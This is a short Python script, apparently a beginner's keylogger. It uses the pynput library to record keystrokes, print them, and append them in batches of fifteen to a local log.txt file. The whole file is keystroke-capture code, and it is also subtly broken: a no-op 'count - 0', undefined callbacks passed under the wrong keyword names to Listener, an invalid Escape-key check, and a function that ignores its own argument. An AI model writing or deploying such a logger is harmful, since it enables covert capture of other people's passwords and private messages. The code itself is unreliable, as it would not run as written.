import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []
def key_press(key):
  global keys, count

  keys.append(key)
  count += 1
  print("{0} pressed".format(key))

  if count >= 15:
    count - 0
    output_file(keys)
    keys = []
    
def output_file(key):
  with open ("log.txt", "a") as f:
    for key in keys:
      k = str(key).replace("''","") #Replace the quotation marks and turn input into string
      if k.find("space") > 0:
        f.write('\n')
      elif k.find("key") == -1:
        f.write(k)

def key_release(key):
  if key == key.esc:
    return False

with Listener(key_press=on_press, key_release=on_release) as listener:
  listener.join()
